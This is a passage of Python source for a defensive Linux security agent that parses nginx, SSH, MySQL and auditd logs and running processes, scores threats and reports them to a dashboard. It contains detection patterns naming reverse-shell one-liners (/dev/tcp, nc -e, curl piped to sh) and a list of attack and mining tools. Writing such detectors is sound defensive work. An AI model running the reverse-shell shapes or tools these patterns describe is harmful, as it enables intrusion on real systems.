                pattern="network_intrusion", severity="medium",
                summary=f"Port/tool probe from {ip} (no SSH identification, {n}x)",
                src_ip=ip, entity=ip, confidence=0.6, source_file=fname, raw=line.strip(),
                dedup_key=f"noident:{ip}:{int(now // 120)}",
            ))
        return out
    m = RE_SSH_PREAUTH.search(line)
    if m:
        ip = m.group("ip")
        n = state.counters.bump(f"preauth:{ip}", 60)
        if n >= 10:
            out.append(Finding(
                pattern="network_intrusion", severity="medium",
                summary=f"Many half-open SSH connections from {ip} ({n} in a minute)",
                src_ip=ip, entity=ip, confidence=0.6, source_file=fname, raw=line.strip(),
                dedup_key=f"preauth:{ip}:{int(now // 60)}",
            ))
        return out

    return out


# ---------------------------------------------------------------------------
# Detectors - nginx access / error, mysql
# ---------------------------------------------------------------------------

def _decode(path: str) -> str:
    try:
        return urllib.parse.unquote_plus(path)
    except Exception:
        return path


def detect_access_line(line: str, st: Settings, state: AgentState, fname: str) -> list[Finding]:
    """nginx access log (combined). This is where web attacks show up."""
    m = RE_ACCESS.match(line.strip())
    if not m:
        return []
    ip = m.group("ip")
    raw_path = m.group("path") or ""
    path = _decode(raw_path)
    status = int(m.group("status") or 0)
    ua = m.group("ua") or ""
    low = path.lower()
    ua_low = ua.lower()
    now = state.counters.now
    out: list[Finding] = []

    # ---- threat intel: is this IP on the local bad list? ------------------
    bl_entry = ip_matches_blocklist(ip, load_blocklist(st.blocklist_file)) if st.blocklist_file else ""
    if bl_entry:
        out.append(Finding(
            pattern="threat_intel_alert", severity="high",
            summary=f"Request from a known-bad IP {ip} (matches {bl_entry})"
                    f"{' to ' + low[:80] if low else ''}",
            src_ip=ip, entity=ip, confidence=0.9, source_file=fname, raw=line.strip(),
            dedup_key=f"intel:{ip}:{int(now // 300)}",
            description=f"{ip} is on the local blocklist and just sent an HTTP request.",
        ))

    # ---- SQL injection ---------------------------------------------------
    if SQLI_RE.search(path) or SQLI_RE.search(ua):
        out.append(Finding(
            pattern="sql_injection",
            severity="critical" if status < 500 else "high",
            summary=f"SQL injection attempt from {ip}: {low[:100]}",
            src_ip=ip, entity=ip, confidence=0.85, source_file=fname, raw=line.strip(),
            dedup_key=f"sqli:{ip}:{int(now // 120)}",
            description=f"{ip} sent a request containing SQL injection syntax (HTTP {status}).",
            extra={"status": status, "path": low[:200]},
        ))
    # ---- XSS -------------------------------------------------------------
    elif XSS_RE.search(path):
        out.append(Finding(
            pattern="xss_attempt", severity="high",
            summary=f"Cross-site scripting attempt from {ip}",
            src_ip=ip, entity=ip, confidence=0.75, source_file=fname, raw=line.strip(),
            dedup_key=f"xss:{ip}:{int(now // 120)}",
            extra={"status": status, "path": low[:200]},
        ))
    # ---- directory traversal --------------------------------------------
    elif TRAVERSAL_RE.search(path):
        out.append(Finding(
            pattern="path_traversal", severity="high",
            summary=f"Directory traversal attempt from {ip}: {low[:100]}",
            src_ip=ip, entity=ip, confidence=0.8, source_file=fname, raw=line.strip(),
            dedup_key=f"trav:{ip}:{int(now // 120)}",
            extra={"status": status, "path": low[:200]},
        ))
    # ---- sensitive files -------------------------------------------------
    else:
        for needle in SENSITIVE_PATHS:
            if needle in low:
                served = status == 200
                critical = any(c in low for c in SENSITIVE_PATHS_CRITICAL)
                out.append(Finding(
                    pattern="sensitive_file_hit" if served else "sensitive_file_probe",
                    severity="critical" if served else ("high" if critical else "medium"),
                    summary=(f"Sensitive file SERVED to {ip}: {low[:90]}" if served
                             else f"Probe for sensitive file from {ip}: {low[:90]}"),
                    src_ip=ip, entity=ip, confidence=0.85 if served else 0.7,
                    source_file=fname, raw=line.strip(),
                    dedup_key=f"probe:{ip}:{needle}:{int(now // 300)}",
                    description=(f"{ip} requested '{low[:120]}' - HTTP {status}."
                                 + (" The server ANSWERED it: check for leaked secrets."
                                    if served else " The server refused it.")),
                    extra={"status": status, "path": low[:200]},
                ))
                break
        else:
            # a web shell being uploaded / executed
            if SHELL_UPLOAD_RE.search(low) and (".." in low or "upload" in low or status in (200, 201)):
                n = state.counters.bump(f"shell:{ip}", 300)
                if n >= 3:
                    out.append(Finding(
                        pattern="webshell_upload", severity="high",
                        summary=f"Possible web shell activity from {ip}: {low[:90]}",
                        src_ip=ip, entity=ip, confidence=0.6, source_file=fname,
                        raw=line.strip(), dedup_key=f"webshell:{ip}:{int(now // 300)}",
                        extra={"status": status, "path": low[:200]},
                    ))

    # ---- scanner user-agent ---------------------------------------------
    hit_ua = next((s for s in SCANNER_AGENTS if s in ua_low), "")
    if hit_ua:
        out.append(Finding(
            pattern="scanner_activity", severity="high",
            summary=f"Attack tool '{hit_ua}' used from {ip}",
            src_ip=ip, entity=ip, confidence=0.85, source_file=fname, raw=line.strip(),
            dedup_key=f"scanner:{ip}:{hit_ua}:{int(now // 600)}",
            description=f"{ip} is using '{hit_ua}' (User-Agent: {ua[:120]}).",
            extra={"tool": hit_ua, "user_agent": ua[:200]},
        ))

    # ---- login endpoint brute force -------------------------------------
    if re.search(r"/(login|signin|sign-in|auth|token|session|api/v\d+/login|users/login)", low) \
            and status in (400, 401, 403, 422):
        n = state.counters.bump(f"weblogin:{ip}", st.web_fail_window)
        if n >= st.web_fail_threshold:
            out.append(Finding(
                pattern="brute_force", severity="high",
                summary=f"Web login brute force from {ip}: {n} rejected logins",
                src_ip=ip, entity=ip, confidence=min(0.6 + 0.03 * n, 0.95),
                source_file=fname, raw=line.strip(),
                dedup_key=f"weblogin:{ip}:{int(now // st.web_fail_window)}",
                extra={"failed_attempts": n, "path": low[:200]},
            ))

    # ---- directory / endpoint scanning (404 flood) ----------------------
    if status == 404:
        n = state.counters.bump(f"nf404:{ip}", st.scan_404_window)
        if n >= st.scan_404_threshold:
            out.append(Finding(
                pattern="directory_scan", severity="high",
                summary=f"Endpoint scanning from {ip}: {n} 'not found' in "
                        f"{st.scan_404_window}s",
                src_ip=ip, entity=ip, confidence=0.8, source_file=fname, raw=line.strip(),
                dedup_key=f"scan404:{ip}:{int(now // st.scan_404_window)}",
            ))

    # ---- request flood / DoS attempt ------------------------------------
    if status >= 400:
        n = state.counters.bump(f"errburst:{ip}", st.error_burst_window)
        if n >= st.error_burst_threshold:
            out.append(Finding(
                pattern="error_burst", severity="medium",
                summary=f"Flood of failing requests from {ip} ({n} in {st.error_burst_window}s)",
                src_ip=ip, entity=ip, confidence=0.7, source_file=fname, raw=line.strip(),
                dedup_key=f"burst:{ip}:{int(now // st.error_burst_window)}",
                extra={"count": n},
            ))

    # ---- unusual methods ------------------------------------------------
    if m.group("method") in ("PUT", "DELETE", "TRACE", "CONNECT") and status >= 400:
        n = state.counters.bump(f"method:{ip}:{m.group('method')}", 300)
        if n >= 5:
            out.append(Finding(
                pattern="network_intrusion", severity="medium",
                summary=f"Repeated {m.group('method')} requests from {ip}",
                src_ip=ip, entity=ip, confidence=0.55, source_file=fname, raw=line.strip(),
                dedup_key=f"method:{ip}:{m.group('method')}:{int(now // 300)}",
            ))

    # ---- very long URL (buffer overflow / fuzzing) ----------------------
    if len(raw_path) > 2000:
        out.append(Finding(
            pattern="network_intrusion", severity="medium",
            summary=f"Very long URL ({len(raw_path)} chars) from {ip}",
            src_ip=ip, entity=ip, confidence=0.5, source_file=fname, raw=line.strip(),
            dedup_key=f"longurl:{ip}:{int(now // 300)}",
        ))

    for f in out:
        f.raw = f.raw or line.strip()
    return out


def detect_error_line(line: str, st: Settings, state: AgentState, fname: str) -> list[Finding]:
    """nginx error log: scanners that fail the TLS handshake show up here."""
    ip = ""
    m = re.search(r"client: (?P<ip>[0-9a-fA-F:.]+)", line)
    if m:
        ip = m.group("ip")
    now = state.counters.now
    if ip and "SSL_do_handshake" in line:
        n = state.counters.bump(f"sslfail:{ip}", 120)
        if n >= 20:
            return [Finding(
                pattern="scanner_activity", severity="medium",
                summary=f"Repeated TLS handshake failures from {ip} ({n})",
                src_ip=ip, entity=ip, confidence=0.6, source_file=fname, raw=line.strip(),
                dedup_key=f"sslfail:{ip}:{int(now // 120)}",
            )]
    if "client intended to send too large body" in line:
        return [Finding(
            pattern="error_burst", severity="medium",
            summary=f"Oversized request body" + (f" from {ip}" if ip else ""),
            src_ip=ip, entity=ip or "http", confidence=0.6, source_file=fname,
            raw=line.strip(), dedup_key=f"bigbody:{ip}:{int(now // 300)}",
        )]
    if re.search(r"(upstream timed out|no live upstreams|worker processes? (exited|shutting down))", line):
        n = state.counters.bump("upstream_down", 300)
        if n >= 5:
            return [Finding(
                pattern="device_health_fail", severity="medium",
                summary="Application behind Nginx is not answering",
                entity="nginx", confidence=0.7, source_file=fname, raw=line.strip(),
                dedup_key=f"upstream:{int(now // 300)}",
            )]
    return []


def detect_mysql_line(line: str, st: Settings, state: AgentState, fname: str) -> list[Finding]:
    m = RE_MYSQL_DENIED.search(line)
    if not m:
        return []
    user, ip = m.group("user"), m.group("ip")
    n = state.counters.bump(f"mysql:{user}:{ip}", st.ssh_fail_window)
    if n >= st.ssh_fail_threshold:
        return [Finding(
            pattern="brute_force", severity="high",
            summary=f"MySQL password guessing for user '{user}' from {ip} ({n})",
            src_ip=ip if re.match(r"^[0-9.]+$", ip) else "", subject=user, entity=user,
            confidence=min(0.6 + 0.03 * n, 0.95), source_file=fname, raw=line.strip(),
            dedup_key=f"mysql:{user}:{ip}:{int(state.counters.now // st.ssh_fail_window)}",
            extra={"failed_attempts": n, "database_user": user},
        )]
    return []


# ---------------------------------------------------------------------------
# Posture / vulnerability checks (read-only - no root needed)
# ---------------------------------------------------------------------------

def posture_findings(st: Settings, state: AgentState) -> list[Finding]:
    out: list[Finding] = []
    now = state.counters.now

    def add(key: str, severity: str, summary: str, desc: str) -> None:
        out.append(Finding(
            pattern="config_weakness" if severity in ("low", "medium", "high") else "device_health_fail",
            severity=severity, summary=summary, entity="server-config",
            confidence=0.8, source_file="config-scan", description=desc,
            dedup_key=f"cfg:{key}:{int(now // 3600)}",
        ))

    sshd = Path("/etc/ssh/sshd_config")
    if sshd.exists():
        txt = ""
        try:
            txt = sshd.read_text(errors="replace")
        except OSError:
            txt = ""
        if txt:
            if re.search(r"^\s*PermitRootLogin\s+yes", txt, re.M | re.I):
                add("rootlogin", "high", "SSH allows direct root login",
                    "PermitRootLogin yes in /etc/ssh/sshd_config. Set it to 'prohibit-password' "
                    "or 'no' and use sudo instead.")
            if re.search(r"^\s*PasswordAuthentication\s+yes", txt, re.M | re.I):
                add("sshpassword", "medium", "SSH accepts passwords (brute-force target)",
                    "PasswordAuthentication yes: internet scans try thousands of passwords every "
                    "day. Use SSH keys and set it to 'no'.")
            if not re.search(r"^\s*MaxAuthTries", txt, re.M | re.I):
                add("maxauth", "low", "SSH MaxAuthTries is not set",
                    "Set 'MaxAuthTries 3' to slow down password guessing.")
    if not Path("/usr/bin/fail2ban-client").exists() and not Path("/etc/fail2ban").exists():
        add("nofail2ban", "medium", "No fail2ban installed",
            "Nothing blocks an IP that keeps trying passwords. Install fail2ban and enable "
            "the sshd jail.")
    for env_file in ("/opt/*/.env", "/srv/*/.env", "/var/www/*/.env", "/home/*/app/.env"):
        for path in Path("/").glob(env_file.lstrip("/")):
            try:
                mode = path.stat().st_mode & 0o777
            except OSError:
                continue
            if mode & 0o077:
                add(f"envperm:{path}", "high", f".env file readable by others ({oct(mode)})",
                    f"{path} has permissions {oct(mode)} - any local user can read the "
                    f"credentials inside. Run: chmod 600 {path}")
    # listening services exposed beyond localhost
    if Path("/proc/net/tcp").exists():
        try:
            lines = Path("/proc/net/tcp").read_text().splitlines()[1:]
            exposed = []
            for ln in lines:
                parts = ln.split()
                if len(parts) > 3 and parts[3] == "0A":      # 0A = LISTEN
                    local = parts[1]
                    port = int(local.split(":")[1], 16)
                    addr = local.split(":")[0]
                    if addr == "00000000" and port not in (80, 443):
                        exposed.append(port)
            for port in sorted(set(exposed)):
                add(f"listen:{port}", "low",
                    f"Port {port} listens on every interface",
                    f"Something is listening on 0.0.0.0:{port}. If it is a database or an "
                    f"internal service, bind it to 127.0.0.1 or block it in the firewall.")
        except OSError:
            pass
    return out


# ---------------------------------------------------------------------------
# Local blocklist (same simple format as the Windows agent)
# ---------------------------------------------------------------------------

def load_blocklist(path: str) -> set[str]:
    """Raw entries of the blocklist file (IPs and CIDR ranges), '#' = comment."""
    try:
        text = Path(path).read_text(errors="replace")
    except OSError:
        return set()
    ips = set()
    for line in text.splitlines():
        item = line.split("#", 1)[0].strip()
        if item:
            ips.add(item)
    return ips


def ip_matches_blocklist(ip: str, entries: set[str]) -> str:
    """Return the matching entry, or '' - supports a plain IP and a CIDR range."""
    if not ip or not entries:
        return ""
    if ip in entries:
        return ip
    try:
        import ipaddress
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return ""
    for item in entries:
        if "/" not in item:
            continue
        try:
            if addr in ipaddress.ip_network(item, strict=False):
                return item
        except ValueError:
            continue
    return ""


# ---------------------------------------------------------------------------
# Sender - talks to the AiBoO backend exactly like the Windows agent
# ---------------------------------------------------------------------------

class Sender:
    def __init__(self, st: Settings, state: AgentState) -> None:
        self.st = st
        self.state = state
        self.queue_path = DIR / QUEUE_FILE_NAME
        self.sent_findings = 0
        self.sent_decisions = 0
        self.errors = 0

    # ---- HTTP ------------------------------------------------------------
    def _post(self, path: str, payload: dict, timeout: int = 15) -> tuple[bool, dict]:
        url = f"{self.st.remote_url}{path}"
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("x-api-key", self.st.api_key)
        req.add_header("x-endpoint-id", self.st.endpoint_name)
        ctx = None
        if not self.st.verify_tls:
            import ssl
            ctx = ssl._create_unverified_context()
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", "replace")
                try:
                    return True, json.loads(body) if body else {}
                except json.JSONDecodeError:
                    return True, {}
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", "replace")[:200]
            log(f"server said HTTP {exc.code} for {path}: {detail}", "WARN")
            return False, {"error": f"HTTP {exc.code}"}
        except Exception as exc:
            log(f"cannot reach {url}: {exc}", "WARN")
            return False, {"error": str(exc)}

    def _get(self, path: str, timeout: int = 10) -> dict | None:
        req = urllib.request.Request(f"{self.st.remote_url}{path}", method="GET")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode("utf-8", "replace"))
        except Exception:
            return None

    # ---- offline queue ---------------------------------------------------
    def _queue(self, entry: dict) -> None:
        try:
            with self.queue_path.open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError as exc:
            log(f"cannot write the offline queue: {exc}", "WARN")

    def flush_queue(self) -> None:
        if not self.queue_path.exists():
            return
        try:
            lines = self.queue_path.read_text(encoding="utf-8").splitlines()
        except OSError:
            return
        keep: list[str] = []
        for line in lines[:500]:
            try:
                item = json.loads(line)
            except json.JSONDecodeError:
                continue
            ok, _ = self._post(item.get("path", "/api/agent/findings"), item.get("payload", {}))
            if not ok:
                keep.append(line)
        try:
            if keep:
                self.queue_path.write_text("\n".join(keep) + "\n", encoding="utf-8")
            elif self.queue_path.exists():
                self.queue_path.unlink()
        except OSError:
            pass

    # ---- remote commands (the dashboard buttons) -------------------------
    def fetch_commands(self) -> list[dict]:
        """GET the commands waiting for this endpoint (REST channel)."""
        data = self._get("/api/agent/commands/pending")
        if isinstance(data, dict) and isinstance(data.get("commands"), list):
            return data["commands"]
        return []

    def ack_command(self, cmd_id: str, status: str, message: str = "",
                    details: str = "", metadata: dict | None = None) -> bool:
        ok, _ = self._post(f"/api/agent/commands/{cmd_id}/ack", {
            "status": "executed" if status == "executed" else "failed",
            "error": "" if status == "executed" else message,
            "platform": "linux",
            "result": {"message": message, "details": details, "metadata": metadata or {}},
        })
        return ok

    # ---- heartbeat -------------------------------------------------------
    def heartbeat(self) -> bool:
        ok, _ = self._post("/api/agent/heartbeat", {
            "source": self.st.endpoint_name,
            "platform": "linux",
            "os": "linux",
            "agent": f"{AGENT_NAME} {VERSION}",
            "hostname": socket.gethostname(),
        }, timeout=10)
        return ok

    def refresh_importance(self) -> None:
        """Read this endpoint's importance (set on the dashboard) - no auth needed."""
        listed = self._get("/api/agent/endpoints")
        if not isinstance(listed, list):
            return
        for ep in listed:
            if isinstance(ep, dict) and ep.get("source") == self.st.endpoint_name:
                imp = str(ep.get("importance") or "").lower()
                if imp in IMPACT_POINTS and imp != self.st.importance:
                    log(f"importance updated by the dashboard: {imp}")
                    self.st.importance = imp
                break

    # ---- findings + gate decisions --------------------------------------
    def send_finding(self, finding: Finding) -> bool:
        payload = finding.to_api(self.st.endpoint_name, socket.gethostname(), "linux")
        if self.st.dry_run:
            log(f"[dry-run] {finding.severity.upper():8} {finding.pattern:22} {finding.summary[:90]}")
            return True
        ok, _ = self._post("/api/agent/findings", payload)
        if ok:
            self.sent_findings += 1
            self.state.remember(finding.dedup_key or payload["id"])
        else:
            self.errors += 1
            self._queue({"path": "/api/agent/findings", "payload": payload})
        return ok

    def send_decision(self, finding: Finding, risk: int, trust: int, intent: int,
                      factors: list[dict], importance: str) -> bool:
        """Gate decision: this is what creates HOLD / BLOCK and approvals."""
        pat = PATTERNS.get(finding.pattern) or PATTERNS["network_intrusion"]
        verdict = verdict_for_risk(risk)
        level = severity_for_risk(risk)
        payload = {
            "event_id": finding.dedup_key or f"linux_{int(time.time()*1000)}",
            "source": self.st.endpoint_name,
            "platform": "linux",
            "threat_type": pat.threat_type,
            "severity": level,
            "verdict": verdict,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "reason": finding.summary,
            "metadata": {
                "platform": "linux",
                "trigate": {
                    "pattern": finding.pattern,
                    "risk": {"score": risk, "level": level},
                    "trust": {"score": trust, "factors": factors},
                    "intent": {"score": intent, "factors": [
                        {"points": pat.intent, "text": pat.label}]},
                    "impact": {"score": IMPACT_POINTS.get(importance, 35),
                               "importance": importance,
                               "factors": [{"points": IMPACT_POINTS.get(importance, 35),
                                            "text": f"This server's importance is {importance.upper()}"}]},
                    "context": {
                        "pattern": finding.pattern,
                        "pattern_label": pat.label,
                        "description": finding.description or finding.summary,
                        "entity": finding.entity or finding.subject or finding.src_ip,
                        "subject": finding.subject,
                        "src_ip": finding.src_ip,
                        "mitre_id": pat.mitre,
                        "mitre_name": pat.mitre_name,
                        "ip_kind": "public" if is_public_ip(finding.src_ip) else
                                   ("private" if finding.src_ip else ""),
                        "local_hour": datetime.now().hour,
                        "log_file": finding.source_file,
                        "platform": "linux",
                    },
                    "recommended": recommend(finding),
                },
            },
        }
        if self.st.dry_run:
            log(f"[dry-run] verdict={verdict.upper():5} risk={risk:3} "
                f"trust={trust} intent={intent} impact={IMPACT_POINTS.get(importance, 35)} "
                f"-> {finding.summary[:80]}")
            return True
        ok, _ = self._post("/api/agent/gate-decision", payload)
        if ok:
            self.sent_decisions += 1
        else:
            self.errors += 1
            self._queue({"path": "/api/agent/gate-decision", "payload": payload})
        return ok


def is_public_ip(value: str) -> bool:
    if not value or not re.match(r"^[0-9a-fA-F:.]+$", value):
        return False
    try:
        import ipaddress
        ip = ipaddress.ip_address(value)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_unspecified)
    except ValueError:
        return False


def recommend(finding: Finding) -> list[dict]:
    """Suggested actions - same action names the dashboard understands."""
    out: list[dict] = []
    if finding.src_ip:
        out.append({"action": "block_access", "target": finding.src_ip,
                    "text": f"Block IP {finding.src_ip} (firewall / fail2ban)"})
    if finding.pattern in ("login_after_brute_force", "brute_force") and finding.subject:
        out.append({"action": "restrict_identity", "target": finding.subject,
                    "text": f"Disable account '{finding.subject}' for 30 min and log off sessions"})
    if finding.pattern in ("account_created", "admin_group_add", "ssh_key_installed") and finding.subject:
        out.append({"action": "revoke_identity", "target": finding.subject,
                    "text": f"Disable account '{finding.subject}' until someone confirms it"})
    if finding.pattern in ("log_cleared", "audit_policy_changed"):
        out.append({"action": "escalate_soc", "target": "",
                    "text": "Escalate to the incident team: evidence was destroyed"})
    if finding.pattern in ("sensitive_file_hit", "webshell_upload"):
        out.append({"action": "escalate_soc", "target": "",
                    "text": "Rotate secrets and inspect the exposed file now"})
    if not out:
        out.append({"action": "log", "target": "", "text": "No action needed - logged for history"})
    return out


def risk_of(finding: Finding, trust: int, importance: str) -> tuple[int, int]:
    pat = PATTERNS.get(finding.pattern) or PATTERNS["network_intrusion"]
    intent = pat.intent
    if finding.pattern == "brute_force":
        intent = min(100, intent + min(10, int(finding.extra.get("failed_attempts", 5)) // 2))
    impact = IMPACT_POINTS.get(importance, 35)
    risk = round(RISK_WEIGHTS["trust"] * (100 - trust)
                 + RISK_WEIGHTS["intent"] * intent
                 + RISK_WEIGHTS["impact"] * impact)
    return max(0, min(100, risk)), min(100, intent)


# ---------------------------------------------------------------------------
# EDR-ish collectors: processes, auditd (kernel), file integrity
# These need NO root: /proc is world-readable, audit.log is read if permitted.
# ---------------------------------------------------------------------------

# Shell/C2 one-liners that are almost never legitimate in a server log
# A reverse shell needs a NETWORK step. Matching on a bare tool name made Ubuntu's
# own package work look like an attack (strip/cp/dracut showed up as "reverse shell"
# on a real server), so every branch below requires the actual C2 shape.
REVERSE_SHELL_RE = re.compile(
    r"(/dev/(tcp|udp)/\S+"
    r"|\bnc\b[^|;]*\s-e\s|\bncat\b[^|;]*\s-e\s|\bnetcat\b[^|;]*\s-e\s"
    r"|\bsocat\b[^|;]*\b(exec|EXEC):"
    r"|\bmkfifo\b[^\n]*\|[^\n]*(nc|ncat|cat|openssl|(ba|z|k)?sh)\b"
    r"|\bnc\b[^\n]*<[^\n]*\|[^\n]*(ba|z|k)?sh\b"
    r"|\b(ba|z|k)?sh\b\s+-i\b"
    r"|\bpython[0-9.]*\b\s+-c\b[^;]*(import socket|socket\.socket|pty\.spawn)"
    r"|\bperl\b\s+-e\b[^;]*socket|\bphp\b\s+-r\b[^;]*(fsockopen|shell_exec)"
    r"|\b(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba)?sh\b"
    r"|\bopenssl\b[^|;]*s_client[^|;]*-quiet"
    r"|\bbase64\b[^|;]*-d[^|;]*\|\s*(ba)?sh\b"
    r"|\bscreen\b\s+-dm\b|\btmux\b\s+new-session\s+-d\b)",
    re.I)

# Package manager / kernel maintenance work happens in /var/tmp with tools that
# look scary in a process list. Never call that a reverse shell.
MAINTENANCE_HINTS = (
    "dracut", "initramfs", "update-initramfs", "unattended-upgrade", "kernel-install",
    "plymouth", "dpkg", "apt-get", "apt ", "/var/lib/dpkg", ".deb ", "mkinitramfs",
)

# Temp folders that package managers legitimately build in.
PACKAGE_TEMP_PREFIXES = ("/var/tmp/dracut.", "/var/tmp/apt", "/tmp/apt", "/tmp/dpkg-",
                         "/var/tmp/dpkg", "/var/tmp/mkinitramfs", "/tmp/mkinitramfs")


def is_maintenance_command(cmd: str) -> bool:
    """True when a command line is normal package/kernel maintenance."""
    low = (cmd or "").lower()
    return any(h in low for h in MAINTENANCE_HINTS)

# Known exploitation tools / miners. Matched as WHOLE tokens, never as plain
# substrings: "frp " used to match inside "cp --reflink=auto -dfrp -L", which made
# a copy command look like a tunnelling tool on a real server.
TOOL_MARKERS = (
    "xmrig", "minerd", "cpuminer", "masscan", "nmap", "hydra", "medusa",
    "sqlmap", "metasploit", "msfconsole", "beef", "ettercap", "aircrack",
    "john", "hashcat", "responder.py", "impacket", "psexec.py", "wmiexec.py",
    "linpeas", "linenum.sh", "pspy", "chisel", "frp", "ngrok", "ligolo",
    "gost", "regeorg", "socks5", "tun0", "proxychains", "mimikatz",
    "etterlog", "airbase", "pwnkit", "mimipenguin", "linux-exploit-suggester",
)
_TOOL_RES = [(marker, re.compile(r"(?:^|[\s/])" + re.escape(marker) + r"(?![a-z])", re.I))
             for marker in TOOL_MARKERS]


def find_tool_marker(cmd: str) -> str:
    """Which known tool appears in this command line (whole token only)?"""
    for marker, rx in _TOOL_RES:
        if rx.search(cmd or ""):
            return marker
    return ""

SUSPICIOUS_EXEC_DIRS = ("/tmp/", "/dev/shm/", "/var/tmp/", "/run/", "/home/*/.cache/")
SCRIPT_EXTS = (".php", ".phtml", ".jsp", ".jspx", ".asp", ".aspx", ".sh", ".pl", ".py",
               ".cgi", ".so", ".elf", ".bin")


def _iter_processes() -> list[dict]:
    """Every running process with its command line (world-readable /proc)."""
    procs = []
    root = Path("/proc")
    if not root.exists():
        return procs
    for entry in root.iterdir():
        if not entry.name.isdigit():
            continue
        pid = int(entry.name)
        try:
            raw = (entry / "cmdline").read_bytes()
            comm = (entry / "comm").read_text(errors="replace").strip()
            stat = (entry / "stat").read_text(errors="replace").split()
            started = stat[21] if len(stat) > 21 else ""
        except (OSError, IndexError):
            continue
        cmdline = raw.replace(b"\x00", b" ").decode("utf-8", "replace").strip()
        if not cmdline:
            continue
        procs.append({"pid": pid, "name": comm, "cmdline": cmdline, "started": started})
    return procs


def detect_suspicious_processes(st: Settings, state: AgentState) -> list[Finding]:
    """Reverse shells, miners and tools that are RUNNING right now."""
    out: list[Finding] = []
    now = state.counters.now
    for p in _iter_processes():
        cmd, pid = p["cmdline"], p["pid"]
        if "aiboo_linux_agent" in cmd:
            continue
        key_base = f"{p['name']}:{cmd[:60]}:{p['started']}"
        if state.already_sent(f"proc:{key_base}"):
            continue
        maintenance = is_maintenance_command(cmd)
        shell = None if maintenance else REVERSE_SHELL_RE.search(cmd)
        tool = find_tool_marker(cmd)
        in_bad_dir = (any(cmd.startswith(d) for d in ("/tmp/", "/dev/shm/", "/var/tmp/"))
                      and not maintenance and not cmd.startswith(PACKAGE_TEMP_PREFIXES))
        if shell:
            out.append(Finding(
                pattern="reverse_shell", severity="critical",
                summary=f"Reverse shell / C2 command running (PID {pid}): {cmd[:120]}",
                entity=f"pid:{pid}", confidence=0.9, source_file="/proc",
                raw=cmd[:400], dedup_key=f"proc:{key_base}",
                description=f"A process is running a reverse-shell / command-and-control "
                            f"pattern: {cmd[:250]}",
                extra={"pid": pid, "process_name": p["name"], "command": cmd[:250],
                       "kill_target": str(pid)},
            ))
        elif tool:
            out.append(Finding(
                pattern="malware", severity="high",
                summary=f"Attack tool running (PID {pid}): {tool.strip()}",
                entity=f"pid:{pid}", confidence=0.75, source_file="/proc",
                raw=cmd[:400], dedup_key=f"proc:{key_base}",
                extra={"pid": pid, "process_name": p["name"], "command": cmd[:250],
                       "kill_target": str(pid)},
            ))
        elif in_bad_dir:
            out.append(Finding(
                pattern="dropped_file", severity="high",
                summary=f"Program running from a temporary folder (PID {pid}): {cmd[:110]}",
                entity=f"pid:{pid}", confidence=0.7, source_file="/proc",
                raw=cmd[:400], dedup_key=f"proc:{key_base}",
                extra={"pid": pid, "process_name": p["name"], "command": cmd[:250],
                       "kill_target": str(pid), "file_path": cmd.split(" ")[0]},
            ))
    return out


def _audit_args(line: str) -> list[str]:
    """Pull the a0= a1= argv of an auditd EXECVE record (quoted or bare)."""
    out: list[str] = []
    for quoted, bare in re.findall(r'a\d+=(?:"([^"]*)"|(\S+))', line):
        value = quoted or bare
        if value:
            out.append(value)
    return out


def detect_audit_line(line: str, st: Settings, state: AgentState, fname: str) -> list[Finding]:
    """
    /var/log/audit/audit.log - what the KERNEL recorded (auditd).
    This is the Linux equivalent of the Windows 4688 process event, plus
    ptrace/execve visibility that a plain log tail cannot give.
    """
    out: list[Finding] = []
    now = state.counters.now
    if "type=EXECVE" in line or "type=SYSCALL" in line:
        args = " ".join(_audit_args(line))
        proctitle = re.search(r'proctitle=([0-9A-Fa-f]+)', line)
        cmd = ""
        if proctitle:
            try:
                cmd = bytes.fromhex(proctitle.group(1)).replace(b"\x00", b" ").decode("utf-8", "replace")
            except ValueError:
                cmd = ""
        cmd = (cmd or args).strip()
        maintenance = is_maintenance_command(cmd)
        if cmd and not maintenance and REVERSE_SHELL_RE.search(cmd):
            out.append(Finding(
                pattern="reverse_shell", severity="critical",
                summary=f"Kernel saw a reverse-shell command: {cmd[:120]}",
                entity=cmd[:60], confidence=0.9, source_file=fname, raw=line.strip()[:400],
                dedup_key=f"audit:exec:{abs(hash(cmd)) % (10**10)}",
                description=f"auditd recorded the execution: {cmd[:250]}",
                extra={"command": cmd[:250], "source": "auditd"},
            ))
        elif cmd and find_tool_marker(cmd):
            out.append(Finding(
                pattern="malware", severity="high",
                summary=f"Kernel saw an attack tool running: {cmd[:110]}",
                entity=cmd[:60], confidence=0.8, source_file=fname, raw=line.strip()[:400],
                dedup_key=f"audit:tool:{abs(hash(cmd)) % (10**10)}",
                extra={"command": cmd[:250], "source": "auditd"},
            ))
        # privilege escalation / injection syscalls
        if "syscall=ptrace" in line or "syscall=101" in line or "syscall=process_vm_writev" in line:
            m_pid = re.search(r" pid=(\d+)", line)
            out.append(Finding(
                pattern="process_injection", severity="high",
                summary="ptrace / process_vm_writev used (process injection attempt)",
                entity="pid:" + (m_pid.group(1) if m_pid else ""),
                confidence=0.7, source_file=fname, raw=line.strip()[:400],
                dedup_key=f"audit:ptrace:{abs(hash(line)) % (10**10)}",
                extra={"source": "auditd"},
            ))
        if "syscall=execve" in line and "uid=0" in line and "comm=" in line:
            comm = re.search(r'comm="([^"]+)"', line)
            exe = re.search(r'exe="([^"]+)"', line)
            name = (comm.group(1) if comm else "") or ""
            path = (exe.group(1) if exe else "") or ""
            if (path.startswith(("/tmp/", "/dev/shm/", "/var/tmp/"))
                    and not path.startswith(PACKAGE_TEMP_PREFIXES)
                    and not maintenance) or name in ("nc", "ncat", "socat", "xmrig"):
                out.append(Finding(
                    pattern="dropped_file", severity="high",
                    summary=f"Root executed a program from a temporary folder: {path or name}",
                    entity=path or name, confidence=0.85, source_file=fname,
                    raw=line.strip()[:400], dedup_key=f"audit:tmp:{abs(hash(line)) % (10**10)}",
